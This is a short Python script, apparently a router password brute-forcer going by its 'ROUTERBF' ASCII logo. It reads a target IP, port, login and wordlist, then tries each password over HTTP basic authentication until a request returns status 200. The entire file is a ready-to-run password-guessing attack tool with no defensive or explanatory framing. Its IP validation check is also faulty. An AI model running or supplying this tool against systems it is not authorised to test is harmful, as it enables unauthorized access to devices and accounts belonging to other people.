from requests import get
from time import time

logo = '''
d8888b.  .d88b.  db    db d888888b d88888b d8888b. d8888b. d88888b 
88  `8D .8P  Y8. 88    88 `~~88~~' 88'     88  `8D 88  `8D 88'     
88oobY' 88    88 88    88    88    88ooooo 88oobY' 88oooY' 88ooo   
88`8b   88    88 88    88    88    88~~~~~ 88`8b   88~~~b. 88~~~   
88 `88. `8b  d8' 88b  d88    88    88.     88 `88. 88   8D 88      
88   YD  `Y88P'  ~Y8888P'    YP    Y88888P 88   YD Y8888P' YP    
                                                           v1.0.0  
'''

try:
    print(logo)
    ip = input("Enter IP:")
    port = int(input("Enter port:"))
    brutelist = input("Input way to brutellist:")
    login = input('Enter login:')

    if '.' not in ip and len(ip.split('.')) != 4:
        print('IP is not valid')

    try:
        with open(brutelist, 'r') as file:
            wordlist = file.read().split('\n')
    except FileNotFoundError:
        file.close()
        print('Brutelist does not exist!')
        quit()

    wordlist_length = len(wordlist)

    print('Opened list with', wordlist_length, 'words')
    start_time = time()
    print('Starting of attack for', ip, '\n')

    try_nomber = 0

    for x in wordlist:
        try_nomber += 1
        print('Trying ' + x + ' [' + str(try_nomber) + '/' + str(wordlist_length) + ']')
        status = get('http://'+ip+':'+str(port), auth=(login, x)).status_code

        if status == 200:
            print("Password is", x)
            print("The password was found through",round(time() - start_time,3),'seconds')

            break
except:
    print('\tError!')
input("Press Enter to finish")
print('Programm is finished!')
